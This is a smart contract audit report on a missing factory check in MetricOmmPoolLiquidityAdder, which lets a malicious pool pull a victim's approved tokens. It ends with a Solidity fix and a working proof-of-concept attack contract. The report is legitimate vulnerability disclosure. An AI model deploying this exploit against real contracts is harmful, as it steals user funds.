Audit Report

## Title
Unvalidated `pool` Parameter in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Approved User Tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

## Summary
`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address and stores it as the authorised callback caller in transient storage without validating it against the factory registry. A victim tricked by a malicious frontend into calling any `addLiquidity*` entry point with a crafted pool address will have up to `maxAmountToken0 + maxAmountToken1` of their approved tokens transferred directly to the malicious pool in a single transaction.

## Finding Description
The constructor at L37 accepts only `weth`; no `FACTORY` immutable is stored. [1](#0-0) 

The NatSpec at L19-21 explicitly acknowledges the missing check. [2](#0-1) 

`_addLiquidity` calls `_setPayContext` with the unvalidated `pool` before invoking `pool.addLiquidity`. [3](#0-2) 

`_setPayContext` writes the attacker-controlled address as `T_SLOT_PAY_POOL` (the `expectedPool`). [4](#0-3) 

The callback enforces `msg.sender == expectedPool` — trivially satisfied because the malicious pool IS the stored expected pool. [5](#0-4) 

The callback then reads `token0`/`token1` from `IMetricOmmPool(msg.sender).getImmutables()` — the malicious pool controls this return value and can name any tokens the victim has approved. [6](#0-5) 

`pay()` executes `safeTransferFrom(payer, recipient, value)` where `payer` is the victim (`msg.sender` of the outer call) and `recipient` is the malicious pool. [7](#0-6) 

By contrast, `MetricOmmSwapRouterBase._requireFactoryPool` performs the exact guard that is absent here. [8](#0-7) 

All three public entry points (`addLiquidityExactShares` with 7 params, `addLiquidityExactShares` with 6 params, and both `addLiquidityWeighted` overloads) funnel through `_addLiquidity` without any factory validation. [9](#0-8) [10](#0-9) [11](#0-10) 

## Impact Explanation
A victim who has approved `MetricOmmPoolLiquidityAdder` for any ERC-20 token loses up to `maxAmountToken0 + maxAmountToken1` of those tokens in a single transaction. The malicious pool receives the tokens directly with no further interaction required. This is a direct, irreversible loss of user principal — a Critical/High impact matching the allowed impact gate (direct loss of user principal above Sherlock thresholds).

## Likelihood Explanation
Any user interacting with the adder through a malicious or compromised frontend is at risk. The only precondition is a prior approval on the adder, which is a normal prerequisite for using the contract. The attacker needs to deploy a contract implementing `addLiquidity` (triggers the callback with `KIND_PAY`, `amount0Delta = max0`, `amount1Delta = max1`) and `getImmutables` (returns the desired victim tokens). No privileged role is required.

## Recommendation
Add a `FACTORY` immutable to `MetricOmmPoolLiquidityAdder` and validate every caller-supplied `pool` address against it before storing it in transient context, mirroring the guard already present in `MetricOmmSwapRouterBase._requireFactoryPool`:

```solidity
// Constructor:
IMetricOmmPoolFactory internal immutable FACTORY;
constructor(address weth, address factory) PeripheryPayments(weth) {
    FACTORY = IMetricOmmPoolFactory(factory);
}

// At the top of _addLiquidity, before _setPayContext:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

## Proof of Concept
```solidity
contract MaliciousPool {
    address immutable adder;
    address immutable token0;
    address immutable token1;
    uint256 constant MAX0 = 1_000_000e6;  // victim's USDC balance
    uint256 constant MAX1 = 500e18;        // victim's WETH balance

    constructor(address _adder, address _t0, address _t1) {
        adder = _adder; token0 = _t0; token1 = _t1;
    }

    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX0, MAX1, abi.encode(uint8(1)) // KIND_PAY
        );
        return (MAX0, MAX1);
    }

    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }
}

// Attack (victim is tricked by malicious frontend into calling this):
// victim has approved adder for USDC and WETH
MaliciousPool mp = new MaliciousPool(adder, USDC, WETH);
LiquidityDelta memory d = LiquidityDelta({binIdxs: new int256[](1), shares: new uint256[](1)});
d.binIdxs[0] = 0; d.shares[0] = 1;
IMetricOmmPoolLiquidityAdder(adder).addLiquidityExactShares(
    address(mp),   // malicious pool — not validated
    victim,        // owner (irrelevant to token pull)
    0,
    d,
    MAX0,          // maxAmountToken0 = victim's full USDC balance
    MAX1,          // maxAmountToken1 = victim's full WETH balance
    ""
);
// Result: victim loses MAX0 USDC + MAX1 WETH; mp receives them directly
```
